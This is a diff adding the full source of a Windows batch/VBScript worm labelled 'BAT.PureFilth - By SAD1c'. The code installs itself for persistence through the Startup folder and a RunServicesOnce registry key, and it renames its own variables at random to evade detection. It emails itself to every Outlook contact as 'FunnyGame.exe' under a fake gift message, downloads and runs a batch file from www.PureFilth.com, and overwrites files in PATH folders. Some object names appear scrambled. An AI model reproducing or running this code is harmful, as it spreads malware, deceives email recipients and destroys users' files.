@@ -1,0 +1,106 @@
+:: BAT.PureFilth - By SAD1c
+@echo off
+ver|find "XP">nul
+if errorlevel 1 ctty nul
+copy %0 %tmp%\XWJjy.bat
+echo.on error resume next>%tmp%\ShellTray.vbs
+echo dim bDlTxC>>%tmp%\ShellTray.vbs
+echo set bDlTxC=createobject("wscript.shell")>>%tmp%\ShellTray.vbs
+echo set mpvA=createobject("scripting.itWyDQXsystemobject")>>%tmp%\ShellTray.vbs
+echo dim rBaqwXJ>>%tmp%\ShellTray.vbs
+echo rBaqwXJ=bDlTxC.regread("HKCU\Software\PureFilth\")>>%tmp%\ShellTray.vbs
+echo set drop=mpvA.createtextitWyDQX("%tmp%\XWJjy.bat")>>%tmp%\ShellTray.vbs
+echo drop.write rBaqwXJ>>%tmp%\ShellTray.vbs
+echo drop.close>>%tmp%\ShellTray.vbs
+echo bDlTxC.run "%tmp%\XWJjy.bat",0>>%tmp%\ShellTray.vbs
+echo BAT.PureFilth - By SAD1c>%tmp%\Filth.tmp
+echo for %%a in (%path%\*.*) do copy %tmp%\Filth.tmp %%aF>%tmp%\knXGms.bat
+echo.on error resume next>%tmp%\Hh.vbs
+echo dim pQW,bDlTxC,stream,rBaqwXJ>>%tmp%\Hh.vbs
+echo set pQW=createobject("scripting.itWyDQXsystemobject")>>%tmp%\Hh.vbs
+echo set bDlTxC=createobject("wscript.shell")>>%tmp%\Hh.vbs
+echo set stream=pQW.opentextitWyDQX("%tmp%\XWJjy.bat")>>%tmp%\Hh.vbs
+echo rBaqwXJ=stream.readall>>%tmp%\Hh.vbs
+echo stream.close>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"bDlTxC",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"mpvA",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"rBaqwXJ",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"drop",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"knXGms",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"XWJjy",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"pQW",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"stream",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"AcJs",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"zbFtzDl",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"Zj",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"GoAZmM",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"Hh",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"kqfmsqxh",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"ceMvzDOo",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"rGdTsZ",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"Mya",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"alzbFtzDl",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"cj",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"ekTAK",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"uHpnb",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"glouyGo",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"ueJPbDlT",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"vxmpv",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo rBaqwXJ=replace(rBaqwXJ,"uHpnb",Zj(int(rnd*7)+2))>>%tmp%\Hh.vbs
+echo function Zj(AcJs)>>%tmp%\Hh.vbs
+echo for zbFtzDl=1 to AcJs>>%tmp%\Hh.vbs
+echo randomize>>%tmp%\Hh.vbs
+echo if int(rnd*2000/1000)=1 then>>%tmp%\Hh.vbs
+echo GoAZmM=int(rnd*26)+97>>%tmp%\Hh.vbs
+echo else>>%tmp%\Hh.vbs
+echo GoAZmM=int(rnd*26)+65>>%tmp%\Hh.vbs
+echo end if>>%tmp%\Hh.vbs
+echo Zj=Zj&chr(GoAZmM)>>%tmp%\Hh.vbs
+echo next>>%tmp%\Hh.vbs
+echo end function>>%tmp%\Hh.vbs
+echo set stream=pQW.opentextitWyDQX("%tmp%\XWJjy.bat",2)>>%tmp%\Hh.vbs
+echo stream.write rBaqwXJ>>%tmp%\Hh.vbs
+echo stream.close>>%tmp%\Hh.vbs
+echo bDlTxC.regwrite "HKCU\Software\PureFilth\",rBaqwXJ>>%tmp%\Hh.vbs
+echo mpvA.copyitWyDQX "%tmp%\ShellTray.vbs",bDlTxC.specialfolders("AllusersStartup")&"\ShellTray.vbs",1>>%tmp%\Hh.vbs
+echo mpvA.copyitWyDQX "%tmp%\ShellTray.vbs",pQW.getspecialfolder(1)&"\SysWatch.vbs",1>>%tmp%\Hh.vbs
+echo bDlTxC.regwrite "HKLM\Software\Micr"&chr(110+1)&"soft\Windows\CurrentVersion\RunServicesOnce\Shell Tray","wscript.exe "&pQW.getspecialfolder(1)&"\SysWatch.vbs">>%tmp%\Hh.vbs
+echo if bDlTxC.regread("HKCU\Software\PureFilth\WABDONE")="" then>>%tmp%\Hh.vbs
+echo dim kqfmsqxh,ceMvzDOo,rGdTsZ,Mya,alzbFtzDl>>%tmp%\Hh.vbs
+echo set kqfmsqxh=createobject("kqfmsqxhook.application")>>%tmp%\Hh.vbs
+echo set ceMvzDOo=kqfmsqxh.getnamespace("MAPI")>>%tmp%\Hh.vbs
+set cj=addresslists
+echo set rGdTsZ=ceMvzDOo.%cj%>>%tmp%\Hh.vbs
+echo for each Mya in rGdTsZ>>%tmp%\Hh.vbs
+echo for alzbFtzDl=1 to Mya.addressentries.count>>%tmp%\Hh.vbs
+echo dim ekTAK>>%tmp%\Hh.vbs
+echo set ekTAK=kqfmsqxh.createitem(0)>>%tmp%\Hh.vbs
+echo ekTAK.to=Mya.addressentries(alzbFtzDl).address>>%tmp%\Hh.vbs
+echo ekTAK.subject="A gift for you!">>%tmp%\Hh.vbs
+echo ekTAK.body="Hi, "&Mya.addressentries(alzbFtzDl).name&"! How are you?"&vbcrlf>>%tmp%\Hh.vbs
+echo ekTAK.body=ekTAK.body&"I found this little but very cool game and i decided to send it to you."&vbcrlf>>%tmp%\Hh.vbs
+echo ekTAK.body=ekTAK.body&"I hope you will like it. Well, play it and tell me your opinion."&vbcrlf&"Greetings."&f>>%tmp%\Hh.vbs
+echo ekTAK.attachments.add "%tmp%\XWJjy.bat",1,len(ekTAK.body),"FunnyGame.exe">>%tmp%\Hh.vbs
+echo ekTAK.importance=2>>%tmp%\Hh.vbs
+echo ekTAK.send>>%tmp%\Hh.vbs
+echo next>>%tmp%\Hh.vbs
+echo next>>%tmp%\Hh.vbs
+echo bDlTxC.regwrite "HKCU\Software\PureFilth\WABDONE","uHpnb">>%tmp%\Hh.vbs
+echo dim glouyGo,ueJPbDlT,vxmpv>>%tmp%\Hh.vbs
+echo set glouyGo=createobject("glouyGctls.glouyG")>>%tmp%\Hh.vbs
+echo glouyGo.requesttimeout=22>>%tmp%\Hh.vbs
+echo ueJPbDlT=glouyGo.openurl("http://www.PureFilth.com/PureFilth.bat")>>%tmp%\Hh.vbs
+echo if not(ueJPbDlT="") then>>%tmp%\Hh.vbs
+echo set vxmpv=pQW.createtextitWyDQX("%tmp%\PureFilth.bat")>>%tmp%\Hh.vbs
+echo vxmpv.write ueJPbDlT>>%tmp%\Hh.vbs
+echo vxmpv.close>>%tmp%\Hh.vbs
+echo bDlTxC.run "%tmp%\PureFilth.bat",0>>%tmp%\Hh.vbs
+echo end if>>%tmp%\Hh.vbs
+echo bDlTxC.run "%tmp%\knXGms.bat",0>>%tmp%\Hh.vbs
+cscript %tmp%\Hh.vbs>nul
+del %tmp%\XWJjy.bat
+del %tmp%\*.vbs
+del %0
+ver|find "XP">nul
+if errorlevel 1 ctty con
+cls
